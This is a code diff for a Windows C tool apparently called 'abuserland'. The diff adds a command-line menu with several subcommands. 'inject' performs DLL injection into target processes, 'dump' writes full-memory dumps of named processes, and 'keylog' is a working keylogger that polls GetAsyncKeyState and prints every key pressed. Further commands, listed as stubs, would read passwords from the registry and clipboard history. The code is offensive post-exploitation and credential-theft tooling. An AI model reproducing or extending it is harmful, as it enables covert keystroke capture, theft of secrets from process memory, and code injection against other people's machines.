@@ -1,9 +1,9 @@
 #include <windows.h>
 // #include <winbase.h>
 #include <tlhelp32.h>
-#include <strings.h>
+#include <dbghelp.h>
+// #include <strings.h>
 #include <stdio.h>
-// #include <wow64apiset.h>
 
 #define PIPE_NAME "\\\\.\\pipe\\inj"
 #ifdef __i386__
@@ -210,7 +210,7 @@ static BOOL GetTargetBitness(HANDLE hProcess, PBOOL isWin32, PBOOL isWOW64, PBOO
     return TRUE;
 }
 
-static BOOL StartInjectionProcess(DWORD processId, const wchar_t *dllName)
+static BOOL StartInjectionProcess(DWORD processId, const WCHAR* dllName)
 {
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
 
@@ -235,7 +235,7 @@ static BOOL StartInjectionProcess(DWORD processId, const wchar_t *dllName)
     CloseHandle(hProcess);
 
     // print details about the process about to be injected
-    wprintf(L"[i] PID %li Details:\n", processId);
+    wprintf(L"[i] PID %lu Details:\n", processId);
     wprintf(L"[i] OS: %ls\n", isWin32 ? L"x86" : L"x64");
     wprintf(L"[i] WOW64: %ls\n", isWOW64 ? L"true" : L"false");
     wprintf(L"[i] Process: %ls\n", isProc32 ? L"x86" : L"x64");
@@ -270,9 +270,11 @@ static BOOL StartInjectionProcess(DWORD processId, const wchar_t *dllName)
         0,                  // Flags and attributes
         NULL);              // Template file
 
-    if(pipeOut == INVALID_HANDLE_VALUE) 
+    if(pipeOut == INVALID_HANDLE_VALUE)
+    {
+        wprintf(L"[-] Unable to open pipe file for handling output, error %lu\n", GetLastError());
         return FALSE;
-
+    }
     STARTUPINFOW si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
@@ -296,7 +298,11 @@ static BOOL StartInjectionProcess(DWORD processId, const wchar_t *dllName)
         &si,        // Pointer to STARTUPINFO structure
         &pi);       // Pointer to PROCESS_INFORMATION structure
 
-    if (!bResult) return FALSE;
+    if (!bResult)
+    {
+        wprintf(L"[-] Unable to create injection process for PID %lu, error %lu", processId, GetLastError());
+        return FALSE;
+    }    
 
     WaitForSingleObject(pi.hThread, INFINITE);
     CloseHandle(pi.hProcess);
@@ -354,42 +360,198 @@ DWORD WINAPI ThreadNamedPipe(LPVOID lpreserved)
     return 0;
 }
 
-int wmain(int argc, wchar_t *argv[])
+static void PrintUsage(WCHAR* name)
+{
+    wprintf(L"Usage: %ls <dump inject keylog clipboard passwords>\n", name);
+    wprintf(L"extract - extract all files embedded inside this executable\n");
+    wprintf(L"dump <process_name> - dumps memory of the process to process_name.pid.dmp\n");
+    wprintf(L"inject <process_name | pid> <dll> - injects dll into process_name or process id\n");
+    wprintf(L"keylog - prints keys pressed\n");
+    wprintf(L"clipboard - prints clipboard text history\n");
+    wprintf(L"passwords - prints passwords found in the registry\n");
+}
+
+
+static inline void ShiftPressed()
+{
+        if(GetAsyncKeyState(VK_SHIFT) & 0x8000)
+            wprintf(L"[^]");
+}
+
+static void PrintKey(BYTE pKey)
+{
+    switch(pKey)
+    {
+    case VK_SHIFT:
+        break;
+    case 0x41 ... 0x5A:
+        ShiftPressed();
+        wprintf(L"%c", pKey);
+        break;
+    case 0x30 ... 0x39:
+        ShiftPressed();
+        wprintf(L"%c", pKey);
+        break;
+    case VK_OEM_1:
+        ShiftPressed();
+        wprintf(L";");
+        break;
+    case VK_OEM_2: 
+        ShiftPressed();
+        wprintf(L"/");
+        break;
+    case VK_OEM_3: 
+        ShiftPressed();
+        wprintf(L"`");
+        break;
+    case VK_OEM_4:
+        ShiftPressed();
+        wprintf(L"[");
+        break;
+    case VK_OEM_5:
+        ShiftPressed();
+        wprintf(L"\\");
+        break;
+    case VK_OEM_6:
+        ShiftPressed();
+        wprintf(L"]");
+        break;
+    case VK_OEM_MINUS:
+        ShiftPressed();
+        wprintf(L"-");
+        break;
+    case VK_OEM_PLUS: 
+        ShiftPressed();
+        wprintf(L"+");
+        break;
+    case VK_OEM_COMMA:
+        ShiftPressed();
+        wprintf(L",");
+        break;
+    case VK_BACK:
+        ShiftPressed();
+        wprintf(L"[BCKSP]");
+        break;
+    case VK_LBUTTON:
+        ShiftPressed();
+        wprintf(L"[LMB]");
+        break;
+    case VK_RBUTTON:
+        ShiftPressed();
+        wprintf(L"[RMB]");
+        break;
+    case VK_RETURN:
+        ShiftPressed();
+        wprintf(L"[ENT]\n");
+        break;
+    case VK_TAB:
+        ShiftPressed();
+        wprintf(L"[TAB]");
+        break;
+    case VK_ESCAPE:
+        ShiftPressed();
+        wprintf(L"[ESC]");
+        break;
+    case VK_CONTROL:
+        ShiftPressed();
+        wprintf(L"[CTRL]");
+        break;
+    case VK_MENU:
+        ShiftPressed();
+        wprintf(L"[ALT]");
+        break;
+    case VK_CAPITAL:
+        ShiftPressed();
+        wprintf(L"[CAP]");
+        break;
+    case VK_SPACE:
+        ShiftPressed();
+        wprintf(L" ");
+        break;
+    case VK_UP:
+        ShiftPressed();
+        wprintf(L"[UP]");
+        break;    
+    case VK_DOWN:
+        ShiftPressed();
+        wprintf(L"[DOWN]");
+        break;
+    case VK_LEFT:
+        ShiftPressed();
+        wprintf(L"[LEFT]");
+        break;
+    case VK_RIGHT:
+        ShiftPressed();
+        wprintf(L"[RIGHT]");
+        break;
+    case VK_LSHIFT: break;
+    case VK_RSHIFT: break;
+    case VK_LCONTROL: break;
+    case VK_RCONTROL: break;
+    case VK_LMENU: break;
+    case VK_RMENU: break;
+    case VK_LWIN: 
+        ShiftPressed();
+        wprintf(L"[WIN]");
+        break;
+    case VK_RWIN:
+        ShiftPressed();
+        wprintf(L"[WIN]");
+        break;
+    default:
+        ShiftPressed();
+        wprintf(L"[0x%x]", pKey & 0xff);
+        break;
+    }
+}
+
+BOOL CommandKeylog()
+{
+    Sleep(150);
+    while(1)
+    {
+        Sleep(40);
+        for(BYTE i = 11; i <= 255; i++) 
+        {
+            if(GetAsyncKeyState(i) & 0x0001)
+            {
+                PrintKey(i);
+            }
+        }
+    }
+}
+
+BOOL CommandExtract()
 {
     if (!ExtractEmbedded())
     {
         wprintf(L"[-] Unable to extract all embedded binaries, continuing ...\n");
+        return FALSE;
     }
+    wprintf(L"[+] Finished extracting files successfully!\n");
+    return TRUE;
+}
 
-    if (argc != 3)
-    {
-        wprintf(L"[!] Usage: abuserland.exe <process_name> <dll>\n");
-        return 1;
-    }
-
-    setbuf(stdout, NULL);
-
-    const wchar_t *filename = argv[1];
-    const wchar_t *dllPath = argv[2];
-
+BOOL CommandInject(WCHAR* process, WCHAR* dllPath)
+{
     DWORD *processIds = NULL;
     DWORD count = 0;
 
-    GetProcessIdsFromFilename(filename, &processIds, &count);
+    GetProcessIdsFromFilename(process, &processIds, &count);
 
     if (count == 0)
     {
-        wprintf(L"[!] Error: No processes with filename \"%ls\" found.\n", filename);
+        wprintf(L"[!] Error: No processes with filename \"%ls\" found.\n", process);
         free(processIds);
-        return 1;
+        return FALSE;
     }
+    // Create thread to continuously read from the named pipe
     CreateThread(NULL, 0, ThreadNamedPipe, NULL, 0, 0);
     for (DWORD i = 0; i < count; i++)
     {
         // Create thread to continuously read from the named pipe
         CreateThread(NULL, 0, ThreadNamedPipe, NULL, 0, 0);
         wprintf(L"[*] Trying to inject into PID %lu\n", processIds[i]);
-        Sleep(100);
         if(!StartInjectionProcess(processIds[i], dllPath))
         {
             wprintf(L"[-] Unable to inject into PID %lu\n", processIds[i]);
@@ -398,6 +560,138 @@ int wmain(int argc, wchar_t *argv[])
     }
 
     free(processIds);
+    return TRUE;
+}
+
+BOOL CommandDump(WCHAR* process)
+{
+    DWORD* processIds = NULL;
+    DWORD count = 0;
+    GetProcessIdsFromFilename(process, &processIds, &count);
+    if (count == 0)
+    {
+        wprintf(L"[!] Error: No processes with filename \"%ls\" found.\n", process);
+        free(processIds);
+        return FALSE;
+    }
+    BOOL areDumped = TRUE;
+    for (DWORD i = 0; i < count; i++)
+    {
+        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processIds[i]);
+        if(hProcess == INVALID_HANDLE_VALUE)
+        {
+            wprintf(L"[-] Unable to open handle with proper access to %ls and PID %lu\n", process, processIds[i]);
+            areDumped = FALSE;
+            continue;
+        }
+        wprintf(L"[+] Handle address for PID %lu is 0x%p\n", processIds[i], hProcess);
+        WCHAR dumpFileName[512];
+        _snwprintf(dumpFileName, sizeof(dumpFileName), L"%s.%i.dmp", process, processIds[i]);
+        HANDLE hDumpFile = CreateFileW(dumpFileName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+        // BOOL isWin32;
+        // BOOL isWOW64;
+        // BOOL isProc32;
+
+        // if (!GetTargetBitness(hProcess, &isWin32, &isWOW64, &isProc32))
+        // {
+        //     wprintf(L"[!] Failed trying to get process bitness data\n");
+        //     fflush(stdout);
+        //     CloseHandle(hProcess);
+        //     return FALSE;
+        // }
+
+        if(hDumpFile == INVALID_HANDLE_VALUE)
+        {
+            wprintf(L"[-] Unable to create file with name %ls\n", dumpFileName);
+            areDumped = FALSE;
+            continue;
+        }
+        BOOL isDumped = MiniDumpWriteDump(hProcess, processIds[i], hDumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+        if(!isDumped)
+        {
+            areDumped = FALSE;
+            wprintf(L"[-] Unable to dump %ls with PID: %lu, error %lu\n", process, processIds[i], GetLastError());
+        }
+        else
+        {
+            wprintf(L"[-] Dump %ls with PID: %lu into file %ls\n", process, processIds[i], dumpFileName);
+        }
+        CloseHandle(hProcess);
+        CloseHandle(hDumpFile);
+    }
+    wprintf(L"[i] Dumping %i process(es) finished\n", count);
+    if(areDumped == FALSE)
+    {
+        wprintf(L"[-] Unable to dump all process(es)\n");
+    }
+    return areDumped;
+}
+
+int wmain(int argc, wchar_t *argv[])
+{
+    WCHAR* programPath = argv[0];
+    if(argc < 2)
+    {
+        PrintUsage(programPath);
+        return 0;
+    }
+
+    setbuf(stdout, NULL);
+
+    if(wcscmp(argv[1], L"extract") == 0)
+    {
+        CommandExtract();
+        return 1;        
+    }
+    else if(wcscmp(argv[1], L"inject") == 0)
+    {
+        if(argc != 4)
+        {
+            wprintf(L"[-] Invalid arguments for inject\n");
+            PrintUsage(programPath);
+            return 0;
+        }
+        WCHAR* process = argv[2];
+        WCHAR* dllPath = argv[3];
+        if(CommandInject(process, dllPath) == FALSE)
+            return 0;
+    }
+    else if(wcscmp(argv[1], L"dump") == 0)
+    {
+        if(argc != 3)
+        {
+            wprintf(L"[-] Invalid arguments for dump\n");
+            PrintUsage(programPath);
+            return 0;
+        }
+        WCHAR* process = argv[2];
+        CommandDump(process);
+        return 1;
+    }
+    else if(wcscmp(argv[1], L"keylog") == 0)
+    {
+        CommandKeylog();
+        //PrintUsage(programPath);
+        return 0;
+    }
+    else if(wcscmp(argv[1], L"passwords") == 0)
+    {
+        PrintUsage(programPath);
+        return 0;
+    }
+    else if(wcscmp(argv[1], L"clipboard") == 0)
+    {
+        PrintUsage(programPath);
+        return 0;
+    }
+    else
+    {
+        PrintUsage(programPath);
+        wprintf(L"[-] Unknown command.\n");
+        return 0;
+    }
+    
     WCHAR readAction[1024];
     BOOL loop = TRUE;
 
